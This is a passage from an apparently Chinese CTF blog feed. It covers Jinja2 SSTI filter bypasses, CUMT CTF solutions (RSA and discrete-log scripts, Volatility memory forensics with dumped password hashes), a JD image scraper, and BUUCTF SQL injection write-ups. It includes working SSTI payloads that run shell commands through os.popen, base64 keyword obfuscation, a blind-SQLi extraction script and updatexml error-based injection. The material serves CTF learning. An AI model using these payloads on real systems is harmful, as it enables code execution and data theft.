class="hljs-string">'x9'</span>])&#125;&#125;

post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="hljs-string">"os"</span>).popen(<span class="hljs-string">'whoami'</span>).read()
复制代码</code></pre></div>



<h2 id="导入主函数读取变量"><a href="#导入主函数读取变量" class="headerlink" title="导入主函数读取变量"></a>导入主函数读取变量</h2><p>有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把<code>/flag</code>文件加载到flag这个变量里面了</p>
<div class="hljs"><pre><code class="hljs python">f = open(<span class="hljs-string">'/flag'</span>,<span class="hljs-string">'r'</span>)
flag = f.read()</code></pre></div>

<p>我们就可以通过<code>import</code>是导入<code>__main__</code>主函数去读变量，payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;%<span class="hljs-keyword">print</span> request.application.__globals__.__getitem__(<span class="hljs-string">'__builtins__'</span>).__getitem__(<span class="hljs-string">'__import__'</span>)(<span class="hljs-string">'__main__'</span>).flag %&#125;</code></pre></div>

<h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>对关键字进行base64编码可绕过一些明文检测机制：</p>
<div class="hljs"><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; import base64
<span class="hljs-meta">&gt;&gt;</span>&gt; base64.b64encode(<span class="hljs-string">'__import__'</span>)
<span class="hljs-string">'X19pbXBvcnRfXw=='</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; base64.b64encode(<span class="hljs-string">'os'</span>)
<span class="hljs-string">'b3M='</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; __builtins_<span class="hljs-number">_</span>.__dict_<span class="hljs-number">_</span>[<span class="hljs-string">'X19pbXBvcnRfXw=='</span>.decode(<span class="hljs-string">'base64'</span>)](<span class="hljs-string">'b3M='</span>.decode(<span class="hljs-string">'base64'</span>)).system(<span class="hljs-string">'calc'</span>)
<span class="hljs-number">0</span></code></pre></div>



<h2 id="过滤了-39-“-双花括号-args-values"><a href="#过滤了-39-“-双花括号-args-values" class="headerlink" title="过滤了 &#39;, “, [, ], _, 双花括号,args, values"></a>过滤了 &#39;, “, [, ], _, 双花括号,args, values</h2><p>过滤了单双引号导致调用函数时不能直接使用字符串常量，但是可以使用变量传值，比如cookies或者 headers(不能使用get或方法ost)，过滤下划线可以使用管道符外加调用attr()方法来绕过。</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs django"><span class="xml">url?args=</span>
<span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span>((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies</span>
<span class="hljs-template-tag">.c)()|attr(request.cookies.d)</span>
<span class="hljs-template-tag">(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)</span>
<span class="hljs-template-tag">(request.cookies.g))(request.cookies.h).read())%&#125;</span>
<span class="xml">Cookie: h=cat</span>
<span class="xml">f*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals_</span>
<span class="xml">_;g=popen</span></code></pre></div>



<h2 id="过滤了-39-“-双花括号-values"><a href="#过滤了-39-“-双花括号-values" class="headerlink" title="过滤了&#39;, “, [, ], _, 双花括号,values"></a>过滤了&#39;, “, [, ], _, 双花括号,values</h2><p>与上面类似</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs stata">url?<span class="hljs-keyword">args</span>=&#123;%<span class="hljs-keyword">print</span>((()|attr(request.<span class="hljs-keyword">args</span>.a)|attr(request.<span class="hljs-keyword">args</span>.b)|attr(request.<span class="hljs-keyword">args</span>.c)()|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">d</span>)(132)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">e</span>)|attr(request.<span class="hljs-keyword">args</span>.f)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">d</span>)(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">g</span>))(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">h</span>).<span class="hljs-keyword">read</span>())%&#125;&amp;<span class="hljs-keyword">h</span>=<span class="hljs-keyword">cat</span>
f*&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;<span class="hljs-keyword">d</span>=__getitem__&amp;<span class="hljs-keyword">e</span>=__init__&amp;f=__globals_
_&amp;<span class="hljs-keyword">g</span>=popen</code></pre></div>

<h2 id="过滤了-39-“-双花括号-args"><a href="#过滤了-39-“-双花括号-args" class="headerlink" title="过滤了&#39;, “, [, ], _, 双花括号,args"></a>过滤了&#39;, “, [, ], _, 双花括号,args</h2><p>使用post方法</p>
<div class="hljs"><pre><code class="hljs vim">url?<span class="hljs-keyword">args</span>=&#123;%<span class="hljs-keyword">print</span>((()|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">a</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">b</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">c</span>)()|attr(request.<span class="hljs-built_in">values</span>.d)(<span class="hljs-number">132</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">e</span>)|attr(request.<span class="hljs-built_in">values</span>.<span class="hljs-keyword">f</span>)|attr(request.<span class="hljs-built_in">values</span>.d)(request.<span class="hljs-built_in">values</span>.g))(request.<span class="hljs-built_in">values</span>.h).<span class="hljs-keyword">read</span>())%&#125;
POST:h=<span class="hljs-keyword">cat</span> <span class="hljs-keyword">f</span>*&amp;<span class="hljs-keyword">a</span>=__class__&amp;<span class="hljs-keyword">b</span>=__base__&amp;<span class="hljs-keyword">c</span>=__subclasses__&amp;d=__getitem__&amp;<span class="hljs-keyword">e</span>=__init__&amp;<span class="hljs-keyword">f</span>=__globals__&amp;g=popen</code></pre></div>





<p>参考连接：</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p>
<p><a href="https://juejin.cn/post/6908600736754434056#heading-18" target="_blank" rel="noopener">细说Jinja2之SSTI&amp;bypass</a></p>
</blockquote>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>cumtfinal</title>
    <url>/2021/01/11/cumtfinal/</url>
    <content><![CDATA[<p>web每做出来，还是太菜了，还是要多做题</p>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h2><p>F12在source中看到main.js，将其中的内容复制在控制台中运行，运行完后控制台会关闭，再次打开控制台，会看到一个</p>
<p><img src="https://i.loli.net/2020/12/26/aVC6ymt8Sn9rARU.png" srcset="/img/loading.gif" alt="img"></p>
<p>打开之后看到还是js代码，但是可以看到</p>
<p><img src="https://i.loli.net/2020/12/26/5nWCd6tuAkPh4U2.png" srcset="/img/loading.gif" alt="image-20201226115939345"></p>
<p>在其中找到flag的其他部分，拼接起来即可</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA签到"><a href="#RSA签到" class="headerlink" title="RSA签到"></a>RSA签到</h2><p>没啥难的，就是找到解密的网站即可</p>
<p>几个网站如下</p>
<blockquote>
<p><a href="http://www.atoolbox.net/Tool.php?Id=937" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo</a></p>
</blockquote>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># n:    807862607863494903203347547751222668477246136996519972166847</span>
<span class="hljs-comment"># c:    6525071913169990474785757170304035615411828876052879070297</span>
<span class="hljs-comment"># e:    65537</span>

<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *
n=<span class="hljs-number">807862607863494903203347547751222668477246136996519972166847</span>
p=<span class="hljs-number">780900790334269659443297956843</span>
q=<span class="hljs-number">1034526559407993507734818408829</span>
e=<span class="hljs-number">65537</span>
c=<span class="hljs-number">6525071913169990474785757170304035615411828876052879070297</span>
d=inverse(e,(p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))
m=pow(c,d,p*q)
print(long2str(m))</code></pre></div>



<h2 id="简单的密码学"><a href="#简单的密码学" class="headerlink" title="简单的密码学"></a>简单的密码学</h2><p>离散对数攻击</p>
<p>脚本如下</p>
<div class="hljs"><pre><code class="hljs python">m = <span class="hljs-number">45930439493588458217814199095166325056793804285450102007731089001050571514856332627851425138364361016243889773238664380678029627984235001868004334568770697</span>
c = <span class="hljs-number">5057805883715955343508948629802682033540608675113624374337084633322875196538392521768197949724904990019045804655058020268973563802830621371118940310488041</span>
n = <span class="hljs-number">2</span> ** <span class="hljs-number">514</span>

<span class="hljs-keyword">import</span> sympy
<span class="hljs-keyword">import</span> binascii
flag=sympy.discrete_log(<span class="hljs-number">2</span>**<span class="hljs-number">514</span>,c,m)

print(binascii.unhexlify(hex(flag)[<span class="hljs-number">2</span>:]))</code></pre></div>



<h2 id="名字不重要"><a href="#名字不重要" class="headerlink" title="名字不重要"></a>名字不重要</h2><p>懂得都懂，是原题</p>
<div class="hljs"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d<span class="hljs-regexp">/200545</span></code></pre></div>



<h2 id="名字没想好"><a href="#名字没想好" class="headerlink" title="名字没想好"></a>名字没想好</h2><p>第一部分</p>
<div class="hljs"><pre><code class="hljs python">gift= <span class="hljs-number">12255978148467209895405401462014060633654138661175100957121874362221982957915022396069673248235108357771688051303453363643967834593066030782680214462115370497967778055593927850150182758869847946921291057362002616022538712593775400754634332361618945061055025544419655001567836482206750906414655010614360056137481173664901476116870144816992211793902146834987166288769615612767704010592138813256140678199511291489394523989294805910740127557682458229594376211232977501267410539674224065875285801753027816046254818608535462445306054117075379711073762930279723764342988824053970592468109679774789092077979655857748513636834</span>
<span class="hljs-keyword">import</span> gmpy2
e=<span class="hljs-number">103738</span>
c=<span class="hljs-number">7357116532209949285136310518084676100522798730487701269950303460540634127932201594120600757671807456790592531487713433579926404640474277692592102315472760853853767347752080563508622523821339163225554653816787201616233932746815764392729597579461985789538131853246938443458331139199802764554726447278501492140335824365867574318693890007499638038064582031311613039571335453968072426153706431456149868515230310567240569544961967582304893471240728585336273245259533905230737876248875784828430507371662455796543123714325161987112223947057481814610592300979207673818538093532100233028106442070524965861451563388404227738574</span>
n=<span class="hljs-number">24511956296934419790810802924028121267308277322350201914243748724443965915830044792139346496470216715543376102606906727287935669186132061565360428924230740995935556111187855700300365517739695893842582114724005232045077425187550801509268664723237890122110051088839310003135672964413501812829310021228720112275276180469100308793523051405119335989674132224715582989624204590983857159312466387546505666052162775188773736419909262619409755848412558718676873188073997893894862353873441073313610102773845304906678909624700529896455885309546409645526387707907518497436045821973310653257012148438207441605902771515486273283273</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
    phi=gift*i
    pq=n+<span class="hljs-number">1</span>-phi
    p_q=gmpy2.iroot(pq**<span class="hljs-number">2</span><span class="hljs-number">-4</span>*n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]
    <span class="hljs-keyword">if</span> gmpy2.is_prime((pq+p_q)//<span class="hljs-number">2</span>):
        p=(pq+p_q)//<span class="hljs-number">2</span>
        q=pq-p
        <span class="hljs-keyword">break</span>
new_e=e//<span class="hljs-number">2</span>
new_d=gmpy2.invert(new_e,(p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))
m_2=gmpy2.powmod(c,new_d,n)
m=gmpy2.iroot(m_2,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]
<span class="hljs-keyword">import</span> binascii
print(binascii.unhexlify(hex(m)[<span class="hljs-number">2</span>:]))
<span class="hljs-comment"># CUMTCTF&#123;now_you_get</span></code></pre></div>



<p>第二部分</p>
<p>很明显给的p和q是相邻的素数</p>
<p>解题思路：<br>1.题目给了 e,d,c三个值，所以由公式 e<em>d=1 mod (q-1)</em>(p-1) 得到 (e<em>d-1)=k \</em> (q-1)<em>(p-1) (设k为整数)<br>2.<strong>分析题目可知p,q接近，p*q为2048位，</strong><br>**所以(p-1)\</em>(q-1)&lt;=2048<strong>计算可知 *<em>e\</em>d-1</strong> 是 <strong>2063</strong> 位的，所以K的取值范围为（pow(2,14),pow(2,15)）</p>
<p>3.通过爆破K的值，可以得到(p-1)*(q-1) 的值，对phi 开平方，进而求得p,q。这里涉及的算法我通过举例来论证。</p>
<p><img src="https://i.loli.net/2020/12/26/QthA21K5VIOybrg.png" srcset="/img/loading.gif" alt="image-20201226123419558"></p>
<p>脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *
<span class="hljs-comment">#from libnum import *</span>
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
e = <span class="hljs-number">0x10001</span>
d = <span class="hljs-number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span>
c = <span class="hljs-number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span>
d = <span class="hljs-number">14519297697723031496224953772301033569165883208616356699837703756220717249229195213146695656923357394378868735444167631602696573904678412172248043414276910206086892084385988564720914312238316434518024995169814463252129242492227202678878240875905293369168263909256455159691392124769949072754243536472227070447391890140409479709945084894060833468804156778720190688101601664725009609222256314873780002770605127043596912060811904733471592387441742111474341938658516761896926403628885365926903655309306738689809023277824030268579979837642613499180913999651379232105756338399243024739524553588216117189742912479604441636257</span>
c = <span class="hljs-number">23574157314515030841894399693996910252287747536395985840285410194536546768646580704111053676040921830550019965767796038280932469005359270920519250763405535872475345625907947986452218739530197421244240070129909526493952916306821311836861766221812155261751444946282559677005557815746813525162411907545113665605490915464367483833005576787591204417525937745572210195816236947103271664048065491627347939268785403334419989160034526164012966888952162714736497312282011026789187871221751240709801544484784941178786820290118585681595783245449236394480319395321877182096839866054466492123200354772280398476167002177544154960579</span>
<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(pow(<span class="hljs-number">2</span>, <span class="hljs-number">14</span>), pow(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>)):
    <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>:
        phi = (e * d - <span class="hljs-number">1</span>) // k
        P1 = iroot(phi, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 对(q-1)*(p-1)开平方</span>
        p = nextprime(P1)  <span class="hljs-comment"># 获取素数P</span>
        q_1 = phi // (p - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 得到(q-1)</span>
        q = q_1 + <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> (isprime(q)):  <span class="hljs-comment"># 对q进行素性检测</span>
            <span class="hljs-keyword">break</span>

n = p * q
m = pow(c, d, n)
m = long_to_bytes(m).decode()

<span class="hljs-comment"># _the_full_flag!@#$%!!!&#125;</span></code></pre></div>





<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>文本.txt-&gt;base64-&gt;佛曰-&gt;维吉尼亚密码</p>
<div class="hljs"><pre><code class="hljs smali">5L2b5puw77ya5ZOG576v5Yal6IiN5oCv6Iul6JiH5Y2z5oCv5a+G5qCX5L6E6YKj5oCv5aSa55qk5pWF5L6E562J5a+m5ZCJ5Zad5LiK5rOi5oCb57y96Ky55Yal5aSi5q6/5ZG85L+x5a+G6YO95puw6YKj5a+G5oGQ57y95puz5L+x6Iul5L6E5a+G5a+G6JeQ6Iez5Yal56SZ5ZOG5pyJ56mG5qeD5qWe55qk5qCX55qk5a+G5oGQ5Lul572w44CC5oCv6Ku46YGu6Iez5L6E5pm65ZGQ5q27

佛曰：哆羯冥舍怯若蘇即怯密栗侄那怯多皤故侄等實吉喝上波怛缽謹冥夢殿呼俱密都曰那密恐缽曳俱若侄密密藐至冥礙哆有穆槃楞皤栗皤密恐以罰。怯諸遮至侄智呐死

RFMRHNS&#123;Tlsw_Xctc_Tn!!&#125;</code></pre></div>

<p>文本2.txt-&gt;base64-&gt;音符解密</p>
<p><img src="https://i.loli.net/2020/12/26/7HhyMQeb5U89PDA.png" srcset="/img/loading.gif" alt="image-20201226121406802"></p>
<p>之后维吉尼亚解密</p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>用到的命令如下</p>
<div class="hljs"><pre><code class="hljs lsl">volatility -f WIN<span class="hljs-number">-6</span>G0M6M15T07<span class="hljs-number">-20201222</span><span class="hljs-number">-120531.</span>raw  imageinfo

volatility -f WIN<span class="hljs-number">-6</span>G0M6M15T07<span class="hljs-number">-20201222</span><span class="hljs-number">-120531.</span>raw --profile=Win7SP1x64 pslist

volatility -f WIN<span class="hljs-number">-6</span>G0M6M15T07<span class="hljs-number">-20201222</span><span class="hljs-number">-120531.</span>raw --profile=Win7SP1x64 filescan | grep -E 'txt|png|jpg|gif|zip|rar|<span class="hljs-number">7</span>z|pdf|doc'

volatility -f WIN<span class="hljs-number">-6</span>G0M6M15T07<span class="hljs-number">-20201222</span><span class="hljs-number">-120531.</span>raw  --profile=Win7SP1x64 printkey -K <span class="hljs-string">"SAM\Domains\Account\Users\Names"</span>

volatility -f WIN<span class="hljs-number">-6</span>G0M6M15T07<span class="hljs-number">-20201222</span><span class="hljs-number">-120531.</span>raw  --profile=Win7SP1x64  hashdump -y <span class="hljs-number">0xfffff8a000024010</span> -s <span class="hljs-number">0xfffff8a000b7d010</span>

volatility -f WIN<span class="hljs-number">-6</span>G0M6M15T07<span class="hljs-number">-20201222</span><span class="hljs-number">-120531.</span>raw  --profile=Win7SP1x64  hivelist</code></pre></div>

<p>file.txt中的内容如下</p>
<div class="hljs"><pre><code class="hljs q">ZmxhZ+WJjeWNiuauteS4um1kNSjnlKjmiLflkI065a+G56CBKe+<span class="hljs-number">8</span>iGN1bXTnlKjmiLfvvIkK5ZCO5Y2K5q615Li65LqM57u056CB5a2X56ymbWQ1CuS4pOerr21kNei/
m+ihjHNoYTHljbPkuLpmbGFn44CC

flag前半段为<span class="hljs-built_in">md5</span>(用户名:密码)（cumt用户）
后半段为二维码字符<span class="hljs-built_in">md5</span>
两端<span class="hljs-built_in">md5</span>进行sha1即为flag。</code></pre></div>



<p><img src="https://i.loli.net/2020/12/26/rMwvzaDybIdjsPh.png" srcset="/img/loading.gif" alt="image-20201226091631647"></p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">Administrator</span><span class="hljs-selector-pseudo">:500</span><span class="hljs-selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-selector-pseudo">:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::
<span class="hljs-selector-tag">Guest</span><span class="hljs-selector-pseudo">:501</span><span class="hljs-selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-selector-pseudo">:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::
<span class="hljs-selector-pseudo">:1000</span><span class="hljs-selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-selector-pseudo">:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::
<span class="hljs-selector-tag">cumt</span><span class="hljs-selector-pseudo">:1002</span><span class="hljs-selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-selector-pseudo">:771bae3633234ef91354c68c6d7dded3</span>:::
<span class="hljs-selector-tag">ctf</span><span class="hljs-selector-pseudo">:1003</span><span class="hljs-selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-selector-pseudo">:700ec8a682f6e41418007992fc604c77</span>:::</code></pre></div>

<p>cumt的秘密md5解密后为 everyone</p>
<p>扫描二位码内容为lovecumt</p>
<p><img src="https://i.loli.net/2020/12/26/tHOhSIlDm2kb18U.png" srcset="/img/loading.gif" alt="image-20201226120433772"></p>
<p>flag是</p>
<div class="hljs"><pre><code class="hljs isbl"><span class="hljs-variable">CUMTCTF</span>&#123;<span class="hljs-function"><span class="hljs-title">sha1</span>(<span class="hljs-title">md5</span>(<span class="hljs-variable">cumt</span>:<span class="hljs-variable">everyone</span>)+<span class="hljs-title">md5</span>(<span class="hljs-variable">lovecumt</span>))&#125;</span>
<span class="hljs-function"><span class="hljs-variable">CUMTCTF</span>&#123;<span class="hljs-number">474</span><span class="hljs-variable">e781ec985094b88fde2f6ecb975b82f90e4a9</span>&#125;</span></code></pre></div>



<p>​p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>jdtest</title>
    <url>/2020/07/18/jdtest/</url>
    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a>
<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : jd.py</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

dir = <span class="hljs-string">"jdtp"</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):
    os.mkdir(dir)

baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>

head = &#123;
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
    &#125;
response = requests.get(url=baseurl, headers = head)
<span class="hljs-comment">#print(response.text)</span>
html = response.text

findlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span>
<span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>
urls = re.findall(findlinks, html)

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)
    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]
    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)
    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
        f.write(res.content)</code></pre></div>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-sql注入</title>
    <url>/2020/10/05/buuoj/</url>
    <content><![CDATA[<h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><a id="more"></a>

<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" srcset="/img/loading.gif" alt></p>
<p>构造盲注语句</p>
<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" srcset="/img/loading.gif" alt></p>
<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" srcset="/img/loading.gif" alt></p>
<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
<div class="hljs"><pre><code class="hljs python">// 二分注入
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php"</span>

data = &#123;id : <span class="hljs-string">""</span>&#125;

flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):
    left = <span class="hljs-number">33</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(right&gt;left):

        data[<span class="hljs-string">"id"</span>] = <span class="hljs-string">"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)"</span>.format(i,mid)
        response = requests.post(url,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hello"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + chr(mid)
    print(flag)

print(flag)</code></pre></div>





<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
<p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" srcset="/img/loading.gif" alt></p>
<p>可是使用报错注入</p>
<blockquote>
<p>报错注入原理：</p>
<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
</blockquote>
<p>相关链接</p>
<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html" target="_blank" rel="noopener">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc" target="_blank" rel="noopener">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610" target="_blank" rel="noopener">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
<blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
</blockquote>
<p>查询语句如下</p>
<div class="hljs"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

